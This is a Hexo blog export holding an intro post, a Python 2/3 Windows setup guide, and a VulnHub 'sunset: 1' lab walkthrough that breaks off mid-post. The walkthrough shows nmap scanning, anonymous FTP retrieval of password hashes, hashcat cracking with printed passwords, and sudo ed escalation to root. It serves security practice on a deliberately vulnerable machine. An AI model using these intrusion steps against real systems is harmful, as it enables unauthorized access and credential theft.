    <content><![CDATA[<p><font color="blue"><strong>*Welcome to lucifer11’s Blog! This is my first hexo blog. Thanks for jiyili told me about this. If you get any problems when reading my blog, you can tell me on QQ:1185151867 or you can ask me on <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">GitHub<i class="fa fa-external-link-alt"></i></span>.<br>*</strong></font></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="关于本博客"><a href="#关于本博客" class="headerlink" title="关于本博客"></a>关于本博客</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本博客是纯技术博客，记录我在学习成长过程中的一些技术。</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p><em>友情博客</em>: <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==">记忆里的纯真<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="本博客所涉及的内容与领域"><a href="#本博客所涉及的内容与领域" class="headerlink" title="本博客所涉及的内容与领域"></a>本博客所涉及的内容与领域</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">硬件安全，软件安全，无线电安全，人工智能AI，各种计算机编程语言，等等。。。</span><br></pre></td></tr></table></figure>

<p>本人的另一个博客: <span class="exturl" data-url="aHR0cHM6Ly80bHVjaWZlci53b3JkcHJlc3MuY29tLw==">LUCIFER的个人技术博客<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="关于本人"><a href="#关于本人" class="headerlink" title="关于本人"></a>关于本人</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本人就一骨灰级死宅，喜爱钻研各种技术，当然，包括计算机以外的技术。</span><br></pre></td></tr></table></figure>
<h3 id="如果你也热爱各种技术"><a href="#如果你也热爱各种技术" class="headerlink" title="如果你也热爱各种技术"></a>如果你也热爱各种技术</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本人很荣幸和您一起讨论技术！</span><br></pre></td></tr></table></figure>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">欢迎各位大神的宝贵意见，请在下方评论即可！</span><br></pre></td></tr></table></figure>
<h3 id="博主QQ：1185151867"><a href="#博主QQ：1185151867" class="headerlink" title="博主QQ：1185151867"></a><em>博主QQ</em>：1185151867</h3><h4 id="特别感谢：记忆里的纯真"><a href="#特别感谢：记忆里的纯真" class="headerlink" title="特别感谢：记忆里的纯真"></a><em>特别感谢</em>：记忆里的纯真</h4><p><img src="/images/redflower.jpg" alt="绯红的彼岸花"></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 博主是大佬</li>
<li><input checked="" disabled="" type="checkbox"> 博主是帅比</li>
<li><input checked="" disabled="" type="checkbox"> 博主是菜鸟</li>
<li><input checked="" disabled="" type="checkbox"> 博主是骨灰级死宅</li>
<li><input checked="" disabled="" type="checkbox"> 博主没人要了</li>
</ul>
]]></content>
      <categories>
        <category>开篇介绍</category>
      </categories>
      <tags>
        <tag>开篇介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>windows同时安装python2和python3</title>
    <url>/2019/12/11/windowspy23/</url>
    <content><![CDATA[<p>（本文仅作记录以备忘）</p>
<p><font color="green">Python 软件基金会宣布，到 2020 年元旦，将不再为编程语言 Python 2.x 分支提供任何支持。这一天将标志着一出延续多年的戏剧的高潮：Python 从较旧的、功能较弱的、广泛使用的版本过渡到更新的、更强大的版本。然而，Python 的新版本在采用上仍然落后于它的旧版本。未来几年里，还会有很多人继续使用 Python 2 编写的程序,有些python程序使用python2开发的，比如sqlmap，与 Python 2 相比，Python 3 有着无数的技术和最终用户增强功能，但却未能永久取代 Python 2。PyPI 存储库中托管的大多数流行包都支持 Python 3（该库是可重用 Python 代码的第一站）。Python 3 现在已经成为许多 Linux 发行版默认的 Python 解释器。大多数最近出版的书籍、编码学院（coding academy）和在线课程都向初学者推荐了 Python 3。也有的程序是python3开发的就造成了运行不同的python程序需要切换不同的python版本的问题，下面是如何让python2和python3在同一windows操作系统上共存的问题。</font></p>
<p>本人再网上搜索了大量文章后，有的文章是同时安装python2和python3，但是此种方法有些复杂，而且出错了也不好解决，创建虚拟环境还需要很多命令，使用完还需要删除虚拟环境，还要改python.exe的名字，还要折腾pip，经过对比与总结，发现下面的操作方法最为实用可靠，命令也少。</p>
<a id="more"></a>

<p>我电脑之前已经安装了python2.7的环境，就不卸载了，下面到Anaconda的官网下载Python 3.7 version，<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5hY29uZGEuY29tL2Rpc3RyaWJ1dGlvbi8jZG93bmxvYWQtc2VjdGlvbg==">windows版下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>下载完成后，安装过程不再赘述，安装时要注意：</p>
<ul>
<li>1.配置环境变量。一定要勾选 Add Anaconda to my PATH environment variable，将 Anaconda 添加到环境变量。</li>
<li>2.将 Anaconda 设为默认的 Python 环境。勾选 Register Anaconda as my default Python 3.7。</li>
</ul>
<p>如下命令说明安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;conda --version</span><br><span class="line">conda 4.7.12</span><br></pre></td></tr></table></figure>

<p>下面来配置，让两个版本的python和pip可以共存在windows上。</p>
<ul>
<li>进入python2.7的目录</li>
</ul>
<p>将python.exe改为python2.exe</p>
<p>然后运行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;python2 -m pip install --upgrade pip --force-reinstall</span><br><span class="line">DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won<span class="string">&#x27;t be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support</span></span><br><span class="line"><span class="string">Collecting pip</span></span><br><span class="line"><span class="string">  Using cached https://files.pythonhosted.org/packages/00/b6/9cfa56b4081ad13874b0c6f96af8ce16cfbc1cb06bedf8e9164ce5551ec1/pip-19.3.1-py2.py3-none-any.whl</span></span><br><span class="line"><span class="string">Installing collected packages: pip</span></span><br><span class="line"><span class="string">  Found existing installation: pip 19.3.1</span></span><br><span class="line"><span class="string">    Uninstalling pip-19.3.1:</span></span><br><span class="line"><span class="string">      Successfully uninstalled pip-19.3.1</span></span><br><span class="line"><span class="string">Successfully installed pip-19.3.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Users\HASEE&gt;python -m pip install --upgrade pip --force-reinstall</span></span><br><span class="line"><span class="string">Collecting pip</span></span><br><span class="line"><span class="string">  Using cached https://files.pythonhosted.org/packages/00/b6/9cfa56b4081ad13874b0c6f96af8ce16cfbc1cb06bedf8e9164ce5551ec1/pip-19.3.1-py2.py3-none-any.whl</span></span><br><span class="line"><span class="string">Installing collected packages: pip</span></span><br><span class="line"><span class="string">  Found existing installation: pip 19.3.1</span></span><br><span class="line"><span class="string">    Uninstalling pip-19.3.1:</span></span><br><span class="line"><span class="string">      Successfully uninstalled pip-19.3.1</span></span><br><span class="line"><span class="string">Successfully installed pip-19.3.1</span></span><br></pre></td></tr></table></figure>

<p>然后测试是否成功共存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;pip2 --version</span><br><span class="line">pip 19.3.1 from d:\python27\lib\site-packages\pip (python 2.7)</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE&gt;pip3 --version</span><br><span class="line">pip 19.3.1 from d:\anaconda3\lib\site-packages\pip (python 3.7)</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE&gt;python2</span><br><span class="line">Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE&gt;python</span><br><span class="line">Python 3.7.4 (default, Aug  9 2019, 18:34:13) [MSC v.1915 64 bit (AMD64)] :: Anaconda, Inc. on win32</span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">This Python interpreter is <span class="keyword">in</span> a conda environment, but the environment has</span><br><span class="line">not been activated.  Libraries may fail to load.  To activate this environment</span><br><span class="line">please see https://conda.io/activation</span><br><span class="line"></span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>测试成功，两个版本的python成功共存。</p>
<p>使用此种方法配置，不但可以共存还可以使用conda在虚拟环境中配置python</p>
<p>如果报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;virtualenv</span><br><span class="line">Fatal error <span class="keyword">in</span> launcher: Unable to create process using <span class="string">&#x27;&quot;d:\python27\python.exe&quot;  &quot;D:\Python27\Scripts\virtualenv.exe&quot; </span></span><br></pre></td></tr></table></figure>

<p>运行如下命令即可解决：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;python -m pip install --upgrade virtualenv</span><br><span class="line">Collecting virtualenv</span><br><span class="line">  Downloading https://files.pythonhosted.org/packages/62/77/6a86ef945ad39aae34aed4cc1ae4a2f941b9870917a974ed7c5b6f137188/virtualenv-16.7.8-py2.py3-none-any.whl (3.4MB)</span><br><span class="line">     |████████████████████████████████| 3.4MB 467kB/s</span><br><span class="line">Installing collected packages: virtualenv</span><br><span class="line">Successfully installed virtualenv-16.7.8</span><br></pre></td></tr></table></figure>
<p>成功解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;virtualenv --version</span><br><span class="line">16.7.8</span><br></pre></td></tr></table></figure>

<p>Anaconda使用参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mb29maXNoLm5ldC9jb21wYXRpYmxlLXB5Mi1hbmQtcHkzLmh0bWw=">用 Anaconda 完美解决 Python2 和 python3 共存问题<i class="fa fa-external-link-alt"></i></span></p>
<p>长舒一口气，真是太兴奋了！！！</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<h4 id="THE-END"><a href="#THE-END" class="headerlink" title="THE END"></a>THE END</h4>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>开发环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[sunset-1]</title>
    <url>/2020/04/14/sunset-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：sunset: 1<br>发布日期：2019年7月29日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>sunset.zip</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhQUdaVTFDNkoheV9QYzBCRUoyRXNBRmlCZVVZOTFzNGU5bWdybG84c040YVQzd0tWZW42cw==">https://mega.nz/#!AGZU1C6J!y_Pc0BEJ2EsAFiBeUY91s4e9mgrlo8sN4aT3wKVen6s<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3Vuc2V0LnppcA==">https://download.vulnhub.com/sunset/sunset.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3Vuc2V0LnppcC50b3JyZW50">https://download.vulnhub.com/sunset/sunset.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>N/A</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.123</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:89:F0:14 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -p- -sV 192.168.56.123</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.5.5</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 21,22 -v -A -T4 --script=vuln 192.168.56.123</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.5.5</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>通过尝试发现可以通过anonymous用户登录ftp</p>
<h3 id="列举"><a href="#列举" class="headerlink" title="列举"></a>列举</h3><p>不出所料，尝试使用匿名用户登录ftp，并成功完成了此操作，此后在那里获得了一个名为“ backup”的文件。首先将该文件保存在系统中，然后打开该文件并得到五个用户的哈希值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># ftp 192.168.56.123</span></span><br><span class="line">Connected to 192.168.56.123.</span><br><span class="line">220 pyftpdlib 1.5.5 ready.</span><br><span class="line">Name (192.168.56.123:root): anonymous</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-r--r--   1 root     root         1062 Jul 29  2019 backup</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; get backup</span><br><span class="line"><span class="built_in">local</span>: backup remote: backup</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">1062 bytes received <span class="keyword">in</span> 0.01 secs (135.0579 kB/s)</span><br><span class="line">ftp&gt; quit</span><br><span class="line">221 Goodbye.</span><br><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># ls</span></span><br><span class="line">backup</span><br><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># cat backup </span></span><br><span class="line">CREDENTIALS:                                                                                                                                                                                                       </span><br><span class="line">office:<span class="variable">$6</span>$<span class="variable">$9ZYTy</span>.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  </span><br><span class="line">datacenter:<span class="variable">$6</span>$<span class="variable">$3QW</span>/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              </span><br><span class="line">sky:<span class="variable">$6</span>$<span class="variable">$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo</span>.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     </span><br><span class="line">sunset:<span class="variable">$6</span><span class="variable">$406THujdibTNu</span>./R<span class="variable">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/</span><br><span class="line">space:<span class="variable">$6</span>$<span class="variable">$4NccGQWPfiyfGKHgyhJBgiadOlP</span>/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/</span><br></pre></td></tr></table></figure>

<p>复制这些hash并将其保存在名为hash的文件中，然后将在crack工具john的帮助下破解用户“sunset”找到密码“ cheer14”的hash。下一步使用此用户名和密码通过ssh连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/sunset<span class="comment"># john hash</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;HMAC-SHA256&quot;</span>, but the string is also recognized as <span class="string">&quot;HMAC-SHA512&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=HMAC-SHA512&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Warning: only loading hashes of <span class="built_in">type</span> <span class="string">&quot;HMAC-SHA256&quot;</span>, but also saw <span class="built_in">type</span> <span class="string">&quot;sha512crypt&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=sha512crypt&quot;</span> option to force loading hashes of that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Warning: Only 10 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 11 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 29 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 20 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 26 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 29 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 8 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 16 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Warning: Only 31 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Almost <span class="keyword">done</span>: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Warning: Only 15 candidates buffered <span class="keyword">for</span> the current salt, minimum 32 needed <span class="keyword">for</span> performance.</span><br><span class="line">Further messages of this <span class="built_in">type</span> will be suppressed.</span><br><span class="line">To see less of these warnings, <span class="built_in">enable</span> <span class="string">&#x27;RelaxKPCWarningCheck&#x27;</span> <span class="keyword">in</span> john.conf</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure>

<p>john太慢，半天出不了结果，如果电脑显卡配置好的话，可以如下选用rockyou.txt字典并使用hashcat来破解密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 1800 password.txt rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device <span class="comment">#2: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#1: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#3: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">Hashes: 5 digests; 5 unique digests, 2 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Uses-64-Bit</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344367</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line">* Runtime...: 3 secs</span><br><span class="line"></span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$4NccGQWPfiyfGKHgyhJBgiadOlP</span>/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/:space</span><br><span class="line"><span class="variable">$6</span><span class="variable">$406THujdibTNu</span>./R<span class="variable">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/:cheer14</span><br><span class="line">Cracking performance lower than expected?</span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password- and salt-length (typically down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Update your OpenCL runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo</span>.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0:sky</span><br><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: sha512crypt <span class="variable">$6</span>$, SHA512 (Unix)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Wed Apr 15 10:29:47 2020 (59 secs)</span><br><span class="line">Time.Estimated...: Wed Apr 15 10:42:31 2020 (11 mins, 45 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:    18801 H/s (10.91ms) @ Accel:64 Loops:32 Thr:32 Vec:1</span></span><br><span class="line">Recovered........: 3/5 (60.00%) Digests, 1/2 (50.00%) Salts</span><br><span class="line">Progress.........: 2162688/28688720 (7.54%)</span><br><span class="line">Rejected.........: 0/2162688 (0.00%)</span><br><span class="line">Restore.Point....: 1081344/14344360 (7.54%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:640-672</span></span><br><span class="line">Candidates.<span class="comment">#1....: 496580 -&gt; 145263w</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: N/A</span></span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Type........: sha512crypt <span class="variable">$6</span>$, SHA512 (Unix)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Wed Apr 15 10:29:47 2020 (14 mins, 9 secs)</span><br><span class="line">Time.Estimated...: Wed Apr 15 10:43:56 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:    16929 H/s (10.62ms) @ Accel:64 Loops:32 Thr:32 Vec:1</span></span><br><span class="line">Recovered........: 3/5 (60.00%) Digests, 1/2 (50.00%) Salts</span><br><span class="line">Progress.........: 28688720/28688720 (100.00%)</span><br><span class="line">Rejected.........: 0/28688720 (0.00%)</span><br><span class="line">Restore.Point....: 14344360/14344360 (100.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:1 Amplifier:0-1 Iteration:4992-5000</span></span><br><span class="line">Candidates.<span class="comment">#1....: $HEX[284d4f544f29333136] -&gt; $HEX[042a0337c2a156616d6f732103]</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Wed Apr 15 10:29:17 2020</span><br><span class="line">Stopped: Wed Apr 15 10:43:58 2020</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub255.jpg"></li>
</ul>
<p>使用下面的命令查看已经破解的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 1800 password.txt rockyou.txt --show</span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$4NccGQWPfiyfGKHgyhJBgiadOlP</span>/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/:space</span><br><span class="line"><span class="variable">$6</span>$<span class="variable">$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo</span>.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0:sky</span><br><span class="line"><span class="variable">$6</span><span class="variable">$406THujdibTNu</span>./R<span class="variable">$NzquK0QRsbAUUSrHcpR2QrrlU3fA</span>/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/:cheer14</span><br></pre></td></tr></table></figure>

<p>得到三个已经破解的用户和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">space    space</span><br><span class="line">sky      sky</span><br><span class="line">sunset   cheer14</span><br></pre></td></tr></table></figure>

<h3 id="利用然后进一步提权"><a href="#利用然后进一步提权" class="headerlink" title="利用然后进一步提权"></a>利用然后进一步提权</h3><p>使用用户Sunset通过ssh登录，并在其中找到了名为user.txt的文件，并在其中再次获得了hash文件。</p>
<p>现在，检查哪个文件具有sudo权限，并且发现ed是sudoers的成员。</p>
<p>因此，执行！/bin/sh命令，并获得root访问权限。</p>
<p>以root用户身份登录后，再次找到了一个名为flag.txt的文件；</p>
<p>获得最后的flag。已经成功获得了root访问权限并通关了这个CTF box。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh sunset@192.168.56.123</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.123 (192.168.56.123)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:n9ATwmONo6fCyPblqlvcO7WcIWZJMqBaqDdo/jYnLPI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.123<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">sunset@192.168.56.123&#x27;</span>s password: </span><br><span class="line">Linux sunset 4.19.0-5-amd64 <span class="comment">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> 